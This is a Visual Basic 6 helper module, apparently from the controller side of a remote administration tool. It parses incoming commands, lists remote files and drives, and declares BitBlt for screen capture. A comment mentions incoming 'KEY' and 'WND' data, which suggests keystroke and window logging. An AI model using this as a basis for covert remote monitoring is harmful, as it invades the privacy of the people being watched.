Attribute VB_Name = "ModAPI"
'API Declarations
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, _
                        ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, _
                        ByVal nHeight As Long, ByVal hSrcDC As Long, _
                        ByVal xSrc As Long, _
                        ByVal ySrc As Long, ByVal dwRop As Long) As Long
Global Const SRCCOPY = &HCC0020
Global Cmd() As String 'Incoming data string

Public Sub Arrayize(sTxt As String, sToken As String)
    'This reads incoming data and searchs for different strings, i.e
    'cmd(0), cmd(1), cmd(3) etc.
    Dim iTokenCnt As Integer
    Dim iTokenLen As Integer
    Dim lOffset As Long
    Dim lPrevOffset As Long
    iTokenLen = Len(sToken)
    lOffset = InStr(sTxt, sToken)
    Do While lOffset > 0
        ReDim Preserve Cmd(iTokenCnt)
        If lOffset - lPrevOffset > 1 Then
           Cmd(iTokenCnt) = Mid$(sTxt, lPrevOffset + 1, lOffset - 1 - lPrevOffset)
        Else
        End If
        lPrevOffset = lOffset
        lOffset = InStr(lOffset + iTokenLen, sTxt, sToken)
        iTokenCnt = iTokenCnt + 1
    Loop
    ReDim Preserve Cmd(iTokenCnt)
    Cmd(iTokenCnt) = Mid$(sTxt, lPrevOffset + 1)
NumCmd = iTokenCnt
End Sub

Sub DispFiles(Files)
'Displays incoming files in the file form
frmFile.listfilemgr.Clear
frmFile.listfilemgr.AddItem ".."
Dim f1, f2
f1 = 1
For i = 1 To Len(Files)
    If Mid(Files, i, 1) = Chr(13) Then
        f2 = i - 2
        frmFile.listfilemgr.AddItem Mid(Files, f1, (f2 - f1) + 2)
        f1 = f2 + 4
    End If
    Next i
End Sub

Sub DispDrives(Drives)
'Displays drives in the drive form
Drives = UCase(Drives) & Chr(13) & Chr(10)
frmDrives.List1.Clear
Dim f1, f2
f1 = 1
For i = 1 To Len(Drives)
    If Mid(Drives, i, 1) = Chr(13) Then
        f2 = i - 2
        frmDrives.List1.AddItem Mid(Drives, f1, (f2 - f1) + 2)
        f1 = f2 + 4
    End If
Next i
End Sub

Function ParseStr(ByVal wStr As String, ByVal wSrch As String) As String    ' sometimes gData appears with
                                                                            ' more than ONE 'KEY' or 'WND'
    Dim i As Integer                                                        ' THIS should solve the problem
    Dim pStr As String
    Dim iStr As Integer
    
    For i = 1 To Len(wStr)
        pStr = Mid(wStr, i, Len(wSrch))
        If pStr = wSrch Then
            iStr = InStr(i + 1, wStr, wSrch)
            If iStr > 0 Then
                ParseStr = ParseStr + Mid(wStr, i + Len(wSrch), iStr - (i + Len(wSrch)))
            Else
                ParseStr = ParseStr + Mid(wStr, i + Len(wSrch))
            End If
        End If
    Next i
    
End Function
